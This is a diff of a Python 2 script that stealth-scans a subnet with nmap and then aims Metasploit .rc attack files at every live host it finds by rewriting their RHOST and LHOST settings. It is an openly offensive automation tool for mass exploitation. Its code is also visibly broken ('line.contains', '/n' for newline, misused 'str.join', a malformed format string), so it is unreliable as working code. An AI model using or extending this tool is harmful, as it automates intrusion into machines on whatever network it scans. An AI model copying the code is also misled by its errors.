@@ -8,6 +8,7 @@
 # discover hosts and services. Then we use the msfconsole to deploy 
 # exploits in the background according to premade .rc files 
 
+import netifaces as ni
 import nmap
 import os
 import sys
@@ -16,10 +17,18 @@ import sys
 # Returns a python-nmap scan result object.
 def scan(subnet):
 
-  #stealth scan#
   print "Starting scan on subnet " + subnet + "...."
   nm = nmap.PortScanner()
-  nm.scan(hosts=subnet, arguments='-sS')
+
+  #stealth scan#
+  try:
+  	nm.scan(hosts=subnet, arguments='-sS')
+
+  #UNEXPECTED ERROR, CRASH#
+  except:
+  	print "UNEXPECTED ERROR:"
+  	raise
+
   host_info = {}
 
   #print out scan results#
@@ -28,6 +37,7 @@ def scan(subnet):
     #print and track live hosts#
     if nm[host].state() == 'up':
       print "FOUND LIVE HOST: " + host
+      print nm[host]
       host_info[host] = []
 
       #list all service info#
@@ -35,6 +45,7 @@ def scan(subnet):
       for proto in nm[host].all_protocols():
       	lport = list(nm[host][proto].keys())
       	lport.sort()
+      	print lport
 
       	for port in lport:
       		print('port: %s \tstate: %s \tname: %s' % (port, nm[host][proto][port]['state'], nm[host][proto][port]['name']))
@@ -42,10 +53,40 @@ def scan(subnet):
 
   return host_info
 
-#Given a path to an .rc file which lists msfconsole commands,#
-#deploy the attack and pause if attack is successful#
-def deploy_attack(attack_file):
-	#TODO: IMPLEMENT THIS#
+#Given a path to an .rc file which lists msfconsole commands,deploy the attack#
+def deploy_attack(attack_file, target_ip):
+
+	#get my IP#
+	my_ip = ni.ifaddresses('eth0')[2][0]
+	
+	#Edit file to reflect target ip, port of target service#
+	#Read from existing, edit write to temp#
+	f = open(attack_file, "r")
+	temp = open(attack_file+".tmp", "w")
+
+	for line in f:
+
+		if line.contains("set"):
+
+			if line.contains("RHOST"):
+				line = "set RHOST "+target_ip+"/n"
+			elif line.contains("LHOST"):
+				line = "set LHOST "+my_ip+"/n"
+		temp.write(line)
+
+	f.close()
+	temp.close()
+
+	#delete file, copy temp to file, delete temp#
+	os.remove(attack_file)
+	f = open(attack_file, "w")
+	temp = open(attack_file+".tmp", "r")
+	for line in temp:
+		f.write(line)
+
+	f.close()
+	temp.close()
+	os.remove(attack_file+".tmp")
 
 #Given a dictionary of python-nmap scan results#
 #Iterate through all .rc files in the attacks/ #
@@ -66,12 +107,12 @@ def attack(scan_info):
 			if(os.path.isdir(path)):
 
 				#get .rc files from directory#
-				attack_files = [ f for f in os.listdir(path) if (os.path.isfile(join(path,f)) and (".rc" in f))]
+				attack_files = [ f for f in os.listdir(path) if (os.path.isfile(str.join(path,f)) and (".rc" in f))]
 				print('Found %i matching attacks for service" %s' % len(attack_files) , name)
 
 				#call helper func to deploy attacks#
 				for f in attack_files:
-					deploy_attack(f)
+					deploy_attack(f, host)
 			else:
 				print('No matching attacks for service: %s' % name)
 
